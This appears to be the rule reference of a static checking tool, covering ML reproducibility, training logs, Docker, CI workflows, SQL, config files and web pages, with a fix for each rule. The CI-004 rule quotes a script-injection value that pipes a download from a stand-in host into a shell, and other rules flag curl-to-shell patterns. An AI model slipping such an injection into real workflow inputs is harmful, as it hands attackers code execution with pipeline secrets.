### REP-017: ML code never saves its config / hyperparameters

No sign of the run configuration being written out (`vars(args)` dump, OmegaConf.save, hparams, wandb/mlflow config...), so results cannot be tied to settings.

**Fix:** Dump the full resolved config (including seed) to the output directory at start.

### REP-018: Non-deterministic CUDA op without use_deterministic_algorithms

`index_add_`, `scatter_`, `scatter_add_`, `index_put_(accumulate=True)`, `bincount` and similar use atomic adds on CUDA, so float results vary run to run unless `torch.use_deterministic_algorithms(True)` is set.

**Fix:** Call `torch.use_deterministic_algorithms(True)` (set CUBLAS_WORKSPACE_CONFIG=:4096:8) or use a deterministic formulation.

## traininglog

| Rule | Severity | Snap | Title |
|---|---|---|---|
| `TL-001` | HIGH | no | NaN or inf in a logged metric |
| `TL-002` | MEDIUM | no | Training loss spike |
| `TL-003` | LOW | no | Training loss has plateaued |
| `TL-004` | MEDIUM | no | Train/validation gap is widening |
| `TL-005` | MEDIUM | no | Validation loss rising while training loss falls |
| `TL-006` | LOW | no | Learning-rate schedule oddity |
| `TL-007` | HIGH | no | Gradient-norm explosion |
| `TL-008` | LOW | no | Epoch/step time regression |
| `TL-009` | MEDIUM | no | GPU memory growth |
| `TL-010` | MEDIUM | no | Duplicated epochs/steps (resume overlap) |

### TL-001: NaN or inf in a logged metric

A metric became NaN or infinite. Once a weight or activation is NaN every later step is garbage, so the run after this line is wasted compute.

**Fix:** Lower the learning rate, add gradient clipping, check for log(0)/division by zero, use bf16 or loss scaling, and resume from the last checkpoint before the first bad line.

### TL-002: Training loss spike

The training loss jumped to more than 3x the median of the preceding steps. Spikes usually mean a bad batch, a too-high learning rate or an unstable optimizer state, and often leave the model worse for a long time.

**Fix:** Inspect the batch at that step, clip gradients, lower the peak learning rate or lengthen warmup, and filter corrupt samples.

### TL-003: Training loss has plateaued

The best training loss in the last quarter of the log is not meaningfully better (< 0.1%) than the best before it: learning has stalled.

**Fix:** Check the learning rate (too low or decayed to nothing), the optimizer, frozen layers or detached graphs; stop early if the run has converged.

### TL-004: Train/validation gap is widening

The validation-minus-training loss gap in the last third of the run is more than twice the gap in the first third: a classic sign of growing overfitting.

**Fix:** Add regularization or augmentation, get more data, reduce capacity, or stop at the epoch with the smallest gap.

### TL-005: Validation loss rising while training loss falls

Over the last third of the run validation loss increased while training loss decreased: the model is memorizing the training set.

**Fix:** Use the checkpoint with the best validation loss (early stopping), add regularization, or check for a train/validation split problem.

### TL-006: Learning-rate schedule oddity

The logged learning rate is negative, zero before the end of the run, or jumps up by 10x or more after warmup. This is rarely intended and often a scheduler bug (wrong step unit, resumed scheduler state lost).

**Fix:** Print the scheduler on a dry run, check the step unit (per step vs per epoch), and restore scheduler state when resuming.

### TL-007: Gradient-norm explosion

The gradient norm exceeded 10x its median and 5 absolute: the optimizer took a step far larger than usual, which typically precedes loss spikes or NaNs.

**Fix:** Enable gradient clipping (clip_grad_norm_), lower the learning rate, check normalization layers and the data at that step.

### TL-008: Epoch/step time regression

The median time per epoch or step in the last third of the run is more than 1.5x that of the first third. Typical causes are a leaking Python structure, growing logging, thermal throttling, or dataloader starvation.

**Fix:** Profile a late step against an early one; look for growing lists/tensors kept across steps, disk or network contention, and GPU clocks.

### TL-009: GPU memory growth

Logged GPU memory rises steadily (at least 20% from the first to the last third, almost never decreasing). This is the signature of a leak, such as storing tensors with their graph attached, and ends in an out-of-memory crash.

**Fix:** Detach tensors you keep (`loss.item()`, `.detach().cpu()`), clear caches deliberately, and look for lists that accumulate per step.

### TL-010: Duplicated epochs/steps (resume overlap)

The same epoch or step is logged more than once with the same metrics. After a resume from an older checkpoint or an appended log this double-counts progress and corrupts curves and averages.

**Fix:** Truncate the log at the resume point or log the resume step; deduplicate by (run id, step) before plotting.

### DOC-001: Base image is :latest or unpinned

`FROM python` / `FROM node:latest` resolves to a different image every build, so builds are not reproducible and a surprise upgrade can break production.

**Fix:** Pin a version tag (`python:3.12-slim`), or better a digest (`python:3.12-slim@sha256:...`).

### DOC-002: Container runs as root (no USER)

Without a `USER` instruction the process runs as root; a bug in the app then gives the attacker root inside the container, and often an easier escape.

**Fix:** Create an unprivileged user (`RUN useradd -r app`) and add `USER app` before CMD/ENTRYPOINT.

### DOC-003: ADD used where COPY would do

`ADD` also downloads URLs and unpacks archives, which is surprising and unverifiable. `COPY` only copies files.

**Fix:** Use `COPY`; for downloads use `curl` with a checksum check in a RUN step.

### DOC-004: apt-get install without --no-install-recommends

Recommended packages are installed too, making the image larger and adding attack surface.

**Fix:** Use `apt-get install -y --no-install-recommends ...`.

### DOC-005: apt-get install without cache cleanup

The package lists stay in the layer and bloat the image.

**Fix:** End the same RUN with `&& rm -rf /var/lib/apt/lists/*` (or use a BuildKit cache mount).

### DOC-006: apt-get update in a separate layer from install

A cached `apt-get update` layer goes stale; a later `install` layer then fails with 404s or installs outdated packages.

**Fix:** Run `apt-get update && apt-get install -y ...` in a single RUN.

### DOC-007: pip install without --no-cache-dir

pip's download cache is stored in the layer and makes the image larger for no benefit.

**Fix:** Use `pip install --no-cache-dir ...` or set `ENV PIP_NO_CACHE_DIR=1`.

### DOC-008: Secret in ENV or ARG

ENV and ARG values are stored in the image metadata and visible with `docker history` / `docker inspect` to anyone who can pull the image. Only the variable name is shown here.

**Fix:** Use BuildKit secrets (`RUN --mount=type=secret,id=x`) at build time and runtime env / a secret store at run time; rotate the leaked value.

### DOC-009: COPY . . before dependency install (cache busting)

Copying the whole source first means any code edit invalidates the dependency-install layer, so every build re-downloads all dependencies.

**Fix:** Copy only the manifest first (`COPY requirements.txt .`, `package*.json`), install, then `COPY . .`.

### DOC-010: No .dockerignore next to the Dockerfile

Without it the whole directory (.git, .env, node_modules, keys) is sent as build context and can be copied into the image by `COPY . .`.

**Fix:** Add a `.dockerignore` listing `.git`, `.env`, `node_modules`, `__pycache__`, build output.

### DOC-011: No HEALTHCHECK

Without a healthcheck the orchestrator only knows the process is alive, not that it still serves requests.

**Fix:** Add `HEALTHCHECK CMD curl -f http://localhost:PORT/health || exit 1` (or a small script).

### DOC-012: Remote script piped into a shell (curl | sh)

Running a downloaded script blindly means whoever controls that URL (or a MITM) controls your image; a partial download can also execute a truncated script.

**Fix:** Download to a file, verify a pinned checksum/signature, then run it.

### DOC-013: More than one CMD in a stage

Only the last CMD takes effect; the earlier ones are silently ignored and usually a leftover mistake.

**Fix:** Keep a single CMD per stage (use ENTRYPOINT + CMD if you need a fixed command with default args).

### DOC-014: SSH port 22 exposed

An SSH daemon inside a container is a second, rarely patched way in, and a sign that the container is being used like a VM.

**Fix:** Remove the sshd and the EXPOSE 22; use `docker exec` / `kubectl exec` for debugging.

### DOC-015: Compose service is privileged

`privileged: true` gives the container nearly all host capabilities and device access; a compromise of the container is a compromise of the host.

**Fix:** Remove it; grant only what is needed with `cap_add: [...]` or `devices:`.

### DOC-016: Compose service uses host networking

`network_mode: host` removes network isolation: the container sees and binds all host interfaces and ports.

**Fix:** Use the default bridge network and publish only the needed ports.

### DOC-017: Docker socket mounted into a container

Access to `/var/run/docker.sock` is root on the host: the container can start a privileged container mounting `/`.

**Fix:** Avoid it; if unavoidable use a socket proxy with a read-only allowlist and never expose that container.

### DOC-018: Secret in compose environment

Passwords and tokens written into the compose file end up in version control and in `docker inspect`. Only the variable name is shown here.

**Fix:** Use `${VAR}` from an untracked `.env`, `env_file`, or Compose `secrets:`; rotate the leaked value.

### DOC-019: Compose image is :latest or unpinned

An untagged image is `latest`: `docker compose pull` can silently switch you to a new major version.

**Fix:** Pin a version tag or digest.

### DOC-020: Compose service has no restart policy

After a crash or host reboot the service stays down.

**Fix:** Add `restart: unless-stopped` (or `on-failure`).

### DOC-021: Compose service has no healthcheck

Compose cannot wait for the service to be ready (`depends_on: condition: service_healthy`) or report it unhealthy.

**Fix:** Add a `healthcheck:` with `test`, `interval`, `retries`.

### DOC-022: Database port published on all interfaces

`5432:5432` binds 0.0.0.0, so the database is reachable from the whole network (and Docker bypasses most host firewalls).

**Fix:** Bind to loopback (`127.0.0.1:5432:5432`) or drop `ports:` and use the compose network.

### CI-001: Action pinned to a tag, not a commit SHA

A tag such as `@v4` can be moved by the action's owner (or an attacker who takes over the repo), so the code your pipeline runs can change without any commit on your side.

**Fix:** Pin to the full 40-character commit SHA and keep the tag in a comment: `uses: actions/checkout@<sha> # v4`; let Dependabot/Renovate bump it.

### CI-002: Action or workflow referenced by branch (@main / @master) or a non-version ref

A branch ref runs whatever is on that branch right now, on every build. One bad push upstream executes in your pipeline with your secrets.

**Fix:** Pin to a release tag at minimum, ideally a commit SHA.

### CI-003: pull_request_target with checkout of the PR head

`pull_request_target` runs with secrets and a write token. Checking out the pull request's code in that context and running it (build, tests, scripts) hands both to anyone who can open a PR.

**Fix:** Use `pull_request` for untrusted code, or split into two workflows: build untrusted code without secrets, then comment/deploy from a trusted `workflow_run`.

### CI-004: Script injection: untrusted ${{ github.event.* }} used inside run:

`${{ }}` is expanded into the shell script text before it runs. A PR title, branch name or comment such as `"; curl evil | sh #` becomes part of the command.

**Fix:** Pass the value through an environment variable (`env: TITLE: ${{ github.event.pull_request.title }}`) and use `"$TITLE"` in the script.

### CI-005: No permissions: block (token gets the repository default)

Without `permissions:` the GITHUB_TOKEN gets the repository or organization default, which is often read-write on everything. A compromised step can push code, tags or releases.

**Fix:** Add `permissions: contents: read` at the top of the workflow and grant extra scopes per job only where needed.

### CI-006: permissions: write-all

Grants the GITHUB_TOKEN every write scope (contents, packages, actions, pull requests, ...) to every step, including third-party actions.

**Fix:** List only the scopes the job needs, for example `contents: read` and `pull-requests: write`.

### CI-007: Secret echoed or printed in a run step

Printing a secret puts it in the build log. Masking is best effort and is defeated by encoding (base64, splitting, reversing), and logs are readable by everyone with repo access.

**Fix:** Never print secrets. To check that one is set, test `[ -n "$X" ]` without echoing it.

### CI-008: Job without timeout-minutes

The default job timeout is 6 hours on GitHub. A hung test or network call burns runner minutes (and money) until it hits that limit.

**Fix:** Add `timeout-minutes:` to each job, about twice its normal duration.

### CI-009: Deploy job without concurrency control

Two pushes in quick succession start two deploys at once; they can interleave and leave production in a mixed state or an older version.

**Fix:** Add `concurrency: { group: deploy-${{ github.ref }}, cancel-in-progress: false }` to the workflow or the deploy job.

### CI-010: curl | bash (pipe a download into a shell)

Runs whatever the server returns, unreviewed and unpinned; a truncated download can also execute half a script.

**Fix:** Download to a file, verify a checksum or signature, then run it; or use a pinned package/action.

### CI-011: continue-on-error: true on a critical step

Tests, security scans, lint and deploy steps that cannot fail the build give a green pipeline with real problems hidden.

**Fix:** Remove it, or move the non-blocking experiment to its own job and keep the critical step blocking.

### CI-012: Package install without dependency caching

Reinstalling dependencies on every run wastes minutes and makes the build depend on the registry being up.

**Fix:** Use the `cache:` option of `actions/setup-node|python|...`, `actions/cache`, or GitLab `cache:` keyed on the lock file.

### CI-013: Deprecated workflow command (set-output, save-state, set-env, add-path)

`::set-output` and `::save-state` are deprecated and `::set-env` / `::add-path` were disabled because of injection risk; they will stop working or warn on every run.

**Fix:** Write to the files instead: `echo "name=value" >> "$GITHUB_OUTPUT"`, `>> "$GITHUB_ENV"`, `>> "$GITHUB_PATH"`.

### CI-014: runs-on: *-latest (runner image drifts)

`ubuntu-latest` moves to a new OS version on GitHub's schedule, so a build that was green yesterday can break with no change from you.

**Fix:** Pin the version (`ubuntu-24.04`) and upgrade deliberately.

### CI-015: Long test job without a build matrix

A job with many steps that runs tests against one runtime version only; a longer pipeline is slower to debug and hides version-specific failures.

**Fix:** Use `strategy.matrix` for the versions/OSes you support, and split lint, test and build into separate jobs so they run in parallel.

### CI-016: GitLab image uses the :latest tag

`:latest` changes under you: the same commit can pass today and fail tomorrow, and you cannot reproduce an old build.

**Fix:** Pin an explicit version tag, ideally a digest (`image: node:20.11-alpine`).

### CI-017: GitLab deploy job without rules / only / when: manual

A deploy job with no `rules:`/`only:` runs on every branch and merge request, so any pushed branch can deploy.

**Fix:** Add `rules: - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH` and/or `when: manual`.

### CI-018: Secret-looking variable with a plain-text value

A password/token/key written in the pipeline file is visible to everyone with read access and stays in git history. The report shows only the variable name.

**Fix:** Define it as a masked, protected CI/CD variable (GitLab Settings or GitHub secrets) and reference it as `$NAME` / `${{ secrets.NAME }}`; rotate the leaked value.

## sqlcheck

| Rule | Severity | Snap | Title |
|---|---|---|---|
| `SQL-001` | LOW | no | SELECT * in a query |
| `SQL-002` | HIGH | no | UPDATE or DELETE without WHERE |
| `SQL-003` | MEDIUM | no | DROP TABLE without IF EXISTS / unguarded TRUNCATE |

| `SQL-007` | MEDIUM | no | NOT IN with a subquery |
| `SQL-008` | LOW | no | Implicit join (comma in FROM) |
| `SQL-009` | MEDIUM | no | ORDER BY RAND() / RANDOM() |
| `SQL-010` | MEDIUM | no | Function applied to an indexed column in WHERE |
| `SQL-011` | MEDIUM | no | CREATE INDEX without CONCURRENTLY (PostgreSQL) |
| `SQL-012` | MEDIUM | no | ADD COLUMN NOT NULL without DEFAULT |
| `SQL-013` | MEDIUM | no | Floating-point type for a money column |
| `SQL-014` | LOW | no | VARCHAR(255) used for most string columns |
| `SQL-015` | MEDIUM | no | GRANT ALL |
| `SQL-016` | HIGH | no | Plaintext password column |
| `SQL-017` | LOW | no | Multi-statement migration without a transaction |
| `SQL-018` | MEDIUM | no | Non-reversible migration in an up/down folder |

### SQL-001: SELECT * in a query

`SELECT *` returns every column, so adding or reordering a column silently changes what callers receive, and it defeats covering indexes and wastes bandwidth.

**Fix:** List the columns you need. `SELECT *` inside `EXISTS (...)` and `COUNT(*)` are fine and not reported.

### SQL-002: UPDATE or DELETE without WHERE

Without a WHERE clause every row in the table is changed or removed. A forgotten filter is a classic production data-loss incident.

**Fix:** Add a WHERE clause (check it with a SELECT first), or write `WHERE true` / use TRUNCATE to make a full-table change deliberate.

### SQL-003: DROP TABLE without IF EXISTS / unguarded TRUNCATE

A DROP TABLE without IF EXISTS fails the whole script when the table is already gone, so the migration cannot be re-run. TRUNCATE has no guard at all and silently deletes every row.

**Fix:** Use `DROP TABLE IF EXISTS t`; run TRUNCATE only in seed/test scripts, or inside a transaction you can roll back.

### SQL-004: CREATE TABLE without a primary key

Tables without a primary key allow duplicate rows, break logical replication and ORMs, and make row-level updates ambiguous.

**Fix:** Add `id BIGINT PRIMARY KEY` (or a natural/composite key). Temporary and staging tables are ignored.

### SQL-005: Column named *_id without an index or foreign key

A `*_id` column is almost always joined or filtered on. Without an index (or a foreign key that creates one) those queries scan the whole table.

**Fix:** Add `REFERENCES parent(id)` and `CREATE INDEX ON t (col)`. Columns already in a primary key, unique constraint or index anywhere in the scanned files are not reported.

### SQL-006: LIKE with a leading wildcard

`LIKE '%foo'` cannot use a normal B-tree index, so the database reads every row.

**Fix:** Anchor the pattern (`'foo%'`), or use full-text search / a trigram index (`pg_trgm`) when you really need substring search.

### SQL-007: NOT IN with a subquery

If the subquery returns a single NULL, `NOT IN` matches nothing, and many planners handle it poorly.

**Fix:** Use `NOT EXISTS (SELECT 1 FROM ... WHERE ...)` or a LEFT JOIN ... IS NULL.

### SQL-008: Implicit join (comma in FROM)

`FROM a, b WHERE ...` hides the join condition in WHERE; forgetting it produces a cross join with millions of rows.

**Fix:** Use explicit `JOIN ... ON ...`.

### SQL-009: ORDER BY RAND() / RANDOM()

The database computes a random value for every row and sorts them all just to return a few.

**Fix:** Pick random ids in application code, use `TABLESAMPLE`, or `WHERE id >= random_offset LIMIT 1`.

### SQL-010: Function applied to an indexed column in WHERE

`WHERE LOWER(email) = ...` or `WHERE DATE(created_at) = ...` stops the database using the plain index on that column, so it scans the table.

**Fix:** Compare the raw column against a range (`created_at >= x AND created_at < y`), or create an expression index (`CREATE INDEX ON t (LOWER(email))`).

### SQL-011: CREATE INDEX without CONCURRENTLY (PostgreSQL)

A plain CREATE INDEX on an existing PostgreSQL table blocks all writes until it finishes, which is an outage on a big table.

**Fix:** Use `CREATE INDEX CONCURRENTLY ...` (it cannot run inside a transaction block, so put it in its own migration).

### SQL-012: ADD COLUMN NOT NULL without DEFAULT

Adding a NOT NULL column with no default fails as soon as the table has rows, and some engines rewrite the whole table.

**Fix:** Add the column nullable, backfill, then `SET NOT NULL`; or give it a DEFAULT.

### SQL-013: Floating-point type for a money column

FLOAT/REAL/DOUBLE cannot represent decimal fractions exactly (0.1 + 0.2 != 0.3), so sums drift by cents.

**Fix:** Use `NUMERIC(12,2)` / `DECIMAL`, or store integer minor units (cents).

### SQL-014: VARCHAR(255) used for most string columns

255 is a habit, not a design decision. It hides real limits (emails, codes, URLs) and in some engines affects row size and index limits.

**Fix:** Choose lengths that match the data, or use `TEXT` with a CHECK constraint where PostgreSQL is the target.

### SQL-015: GRANT ALL

Granting every privilege breaks least privilege: a leaked application credential can drop tables or change grants.

**Fix:** Grant only what the role needs, e.g. `GRANT SELECT, INSERT, UPDATE ON t TO app`.

### SQL-016: Plaintext password column

A text column named `password` suggests passwords are stored as readable text; one SQL injection or backup leak exposes every account.

**Fix:** Store a salted hash from bcrypt/argon2 and name the column `password_hash`.

### SQL-017: Multi-statement migration without a transaction

If statement 3 of 5 fails, the first two stay applied and the schema is left half-migrated.

**Fix:** Wrap the file in `BEGIN; ... COMMIT;` (or let the migration tool do it: goose, dbmate and Flyway are recognised and not reported).

### SQL-018: Non-reversible migration in an up/down folder

The folder uses up/down pairs, but this migration has no down (or an empty one), so a rollback silently skips it.

**Fix:** Add the matching `.down.sql` that undoes the change, or document why it is irreversible.

### CFG-001: Duplicate key in a config file

The same key appears twice in one scope. Parsers silently keep the last (or first) value, so the line you edited may be ignored.

**Fix:** Delete the duplicate; keep one definition per key.

### CFG-002: Debug mode enabled in a production-looking config

DEBUG=true in a prod file exposes stack traces, internal paths and sometimes an interactive console, and slows the app.

**Fix:** Set debug to false in production files; drive it from the environment.

### CFG-003: Secret in plain text

Passwords, tokens and keys in config files end up in version control, backups and images. Only the first 4 characters and the length are shown.

**Fix:** Move it to a secret manager or an untracked environment variable, rotate it, and keep a placeholder in the file.

### CFG-004: Default or weak password

Values like admin, password, changeme or 123456 are the first thing attackers try.

**Fix:** Generate a long random password and inject it at deploy time.

### CFG-005: localhost or hard-coded IP in a production-looking config

localhost/127.0.0.1 points at the wrong machine once deployed, and literal IPs break when hosts move.

**Fix:** Use a DNS name or a service name supplied by the environment.

### CFG-006: .env and .env.example keys differ

Keys missing from .env break the app at runtime; keys missing from .env.example leave new developers guessing.

**Fix:** Keep both files in sync (values may differ, key names should not).

### CFG-007: Trailing whitespace in a value

Many parsers keep the trailing space, so `HOST=db ` is a different host than `HOST=db`. Invisible and hard to debug.

**Fix:** Remove the trailing whitespace or quote the value.

### CFG-008: Unquoted value with spaces in a .env file

Shells that `source` the file split on the space or run the second word as a command; dotenv libraries differ on how they treat it.

**Fix:** Wrap the value in quotes: KEY="a b".

### CFG-009: Invalid JSON / TOML syntax

The file does not parse, so the application will fail to start or fall back to defaults.

**Fix:** Fix the reported line; validate in CI (python -m json.tool, tomllib).

### CFG-010: YAML indented with tabs

YAML forbids tab indentation; parsers reject the file.

**Fix:** Indent with spaces only and configure the editor accordingly.

### CFG-011: http:// URL where https is likely

Plain HTTP sends credentials and data unencrypted and can be tampered with in transit.

**Fix:** Use https:// for anything that leaves the machine or private network.

### CFG-012: Zero, negative or very long timeout / pool size

A zero or negative timeout often means 'wait forever'; a pool size of 0 or less means no connections; hour-long timeouts hold resources during outages.

**Fix:** Use a bounded timeout (seconds to a minute) and a positive pool size.

### CFG-013: Wildcard CORS origin

Access-Control-Allow-Origin: * lets any website call the API from a visitor's browser; combined with credentials it is a data-theft risk.

**Fix:** List the exact origins that need access.

### CFG-014: Private key path world-readable or in a temp directory

A key file readable by every local user (or kept in /tmp) can be copied by any other account or process on the machine.

**Fix:** chmod 600 the key, store it outside /tmp, and keep it out of the repository.

### CFG-015: Env var read in code but missing from .env.example

Developers cannot discover required variables, and deployments fail only when that code path runs.

**Fix:** Add the variable (with a placeholder value) to .env.example, or give the code a default.

### WEB-001: Image without alt attribute

Screen readers have nothing to announce, and the text is lost when the image fails to load.

**Fix:** Add a short `alt` describing the image, or `alt=""` if it is purely decorative.

### WEB-002: Missing lang attribute on <html>

Screen readers and translation tools guess the language, often wrongly.

**Fix:** Use `<html lang="en">` (or the page's real language).

### WEB-003: Missing or empty <title>

The title is the tab label, the search-result headline and the first thing a screen reader reads.

**Fix:** Add a unique, descriptive `<title>` in `<head>`.

### WEB-004: Missing meta viewport

Without it mobile browsers render a ~980px desktop layout and shrink it.

**Fix:** Add `<meta name="viewport" content="width=device-width, initial-scale=1">`.

### WEB-005: Missing meta description

Search engines fall back to random page text for the snippet.

**Fix:** Add `<meta name="description" content="...">` (about 150 characters).

### WEB-006: Form control without a label

Inputs with no label, aria-label or title are unusable with a screen reader and have a tiny click target.

**Fix:** Wrap it in `<label>`, or add `<label for=ID>` or `aria-label`. A placeholder is not a label.

### WEB-007: Button without accessible text

An icon-only button with no text or aria-label is announced just as "button".

**Fix:** Add visible text, `aria-label`, or `title`.

### WEB-008: Duplicate id

Ids must be unique: `getElementById`, label `for=` and anchors only reach the first one.

**Fix:** Rename one of them, or use a class.

### WEB-009: Heading level skipped

Jumping from h2 to h4 breaks the outline that screen-reader users navigate by.

**Fix:** Use consecutive heading levels; style with CSS instead of picking a smaller tag.

### WEB-010: Empty link, href="#" or javascript: href

Such links have no destination or no name: they jump to the page top, break middle-click and are invisible to assistive tech.

**Fix:** Use a real URL, or a `<button>` for actions; give every link text.

### WEB-011: target=_blank without rel=noopener

Older browsers give the opened page `window.opener`, letting it redirect your tab (reverse tabnabbing).

**Fix:** Add `rel="noopener noreferrer"`.

### WEB-012: Mixed content: http:// resource on an https page

Browsers block or warn about insecure scripts, styles and frames, and anything on the wire can be rewritten.

**Fix:** Use https:// (or a relative URL) for every subresource.

### WEB-013: Render-blocking script in <head>

A classic script without defer/async stops HTML parsing until it is downloaded and run.

**Fix:** Add `defer` (keeps order) or `async`, or move it to the end of `<body>`.

### WEB-014: Image without width/height

The browser cannot reserve space, so content jumps when the image loads (layout shift).

**Fix:** Set `width` and `height` attributes (or CSS `aspect-ratio`).

### WEB-015: Inline event handler attribute

onclick= and friends mix behaviour into markup and block a strict Content-Security-Policy.

**Fix:** Use `addEventListener` in a script file.

### WEB-016: Third-party script/stylesheet without integrity (SRI)

If the CDN is compromised, the code runs on your page unchecked.

**Fix:** Add `integrity="sha384-..." crossorigin="anonymous"`, or self-host the file.

### WEB-017: Large inline base64 blob (> 100 KB)

Inlined data bloats the HTML/CSS/JS, can't be cached separately and delays first paint.

**Fix:** Ship it as a separate file (compressed, cacheable).

### WEB-018: Huge JS/CSS file (> 1 MB)

Big bundles slow the first load on mobile networks and parse time grows with size.

**Fix:** Minify, split by route, tree-shake, and serve with gzip/brotli.

### WEB-019: Outdated jQuery / Bootstrap version

jQuery < 3 and Bootstrap < 5 are end-of-life and have known XSS issues. Detected from the file name or URL (heuristic).

**Fix:** Upgrade to a maintained release (jQuery 3.x, Bootstrap 5.x).

### WEB-020: Missing favicon

Browsers request /favicon.ico anyway and log a 404; tabs and bookmarks show a blank icon.

**Fix:** Add `<link rel="icon" href="/favicon.ico">`.

### WEB-021: Missing canonical link

Duplicate URLs (query strings, trailing slashes) split search ranking.

**Fix:** Add `<link rel="canonical" href="https://...">`.

### WEB-022: console.log / debugger left in JavaScript

Debug output leaks internals to users, and `debugger` halts execution when DevTools is open.

**Fix:** Remove it, or strip it in the build (e.g. esbuild `drop: ["console", "debugger"]`).
